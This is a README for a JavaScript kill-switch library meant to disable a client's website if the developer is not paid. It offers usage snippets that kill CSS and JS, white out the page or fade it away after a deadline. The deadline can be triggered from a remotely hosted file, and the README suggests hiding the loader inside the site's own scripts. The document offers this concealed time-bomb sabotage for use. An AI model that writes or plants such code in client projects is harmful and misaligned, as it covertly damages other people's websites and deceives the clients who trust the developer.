<img src="logo.jpg"  >

# Tic-Tac

## Client not paid ?
Put a deadline on a project or just activate/desactivate it remotely For personnals reasons (Never get paid on a project, etc...), kill CSS, JS, show a whiteScreen or add opacity to the body tag and decrease it every day until their site completely fades away.

**NOTE: "Am not responsible in the bad use of this project"**

## How it work?
A date format and a deadline is given in parameter to the system TicTac which evaluates whether or not the deadline has already arrived or not. If so then it hides the style and script of the page of the visitor momentarily for an unreadable rendition so that we do not call the developer again

## Features

- KillJS of the project in the browser rendering.
- KillCSS of the project in the browser rendering.
- Make the screen becomes completely WHITE in the browser rendering.
- Put a DeadLine for all this feature to happens.
- Set theese parameters remotely.

## Basic usage:
```js
// Import the script
// then
// "MONTH / DAY / YEAR"
// 07/07/2019: the date
checkDate(['07/07/2019']);
```

## More options
```js
/**
* [tictac_options description]
* @param  {[type]}  date        (Required) [The date (For 'en' format date use: Month/Day/Year For 'fr' format date use: Day/Month/Year)]
* @param  {Boolean} killCss     (optional) [To Lock or Unlock  only Style]
* @param  {Boolean} killJs      (optional) [To Lock or Unlock  only Script code]
* @param  {Boolean} whitescreen (optional) [To show a WhiteScreen]
*/
var tictac_options = ['07/07/2019'];

// CASE 1 :
// params: "MONTH / DAY / YEAR",   true,    true,     false
// What will be done: Kill CSS, Kill JS, don't show White screen
// var tictac_options = ['04/05/2019', true, true, false];

// CASE 2 :
// params: "MONTH / DAY / YEAR",   true,    true,     true
// What will be done: Show White screen (and kill every thing)
// var tictac_options = ['04/05/2019', true, true, true];

/**
* [checkDate description]
* Default use: checkDate(tictac_options);
* Remotely use: checkDate(null, [true, 'https://My_Secret_Hosting_DateLine.com/finalDateForWebSitedash.txt']);
* @param  {Array}   remoteDead  (optional) [To access a Hosted date Ex: [false, 'https://My_Secret_Hosting_DateLine.com/finalDateForWebSitedash.txt']  in the file respect this format en, 04/06/2019 ]
*/
// Default
// "MONTH / DAY / YEAR", killCss, killJs, WhiteScreen
var tictac_options = ['01/01/2019', false, false, true];
checkDate(tictac_options);

// Remote Mode
// http://127.0.0.1:8081 is a host you specify where the file with all parameters to fetch will be found
var remoteDead = [true, 'http://127.0.0.1:8081/finalDateForWebSitedash.txt'];
checkDate(null, remoteDead);
```
An example of the remote file :
```
01/01/2019, true, true, true
```

## Complete integration example

Example of integration
```html
<head>
	<title>A webSite Title</title>

	<!-- Put these few lines of code in your HEAD tag of page before ANY script in your website or you can hide it in a personnal script -->
	<!-- First, import tictac and then config your deadline date -->
	<script src="https://rawgit.com/Sanix-Darker/Tic-Tac/master/js/tictac.min.js"></script>
	<script type="text/javascript">
		checkDate(['12/27/2019']);
	</script>
</head>
<body>
	...The Website content...
</body>
```

##### NB: What's really coul with Tic Tac is that, it affect "any files" in your website, he just "Bichakalla" the user's rendering.

## Author

- [Sanix-Darker](https://github.com/Sanix-Darker)
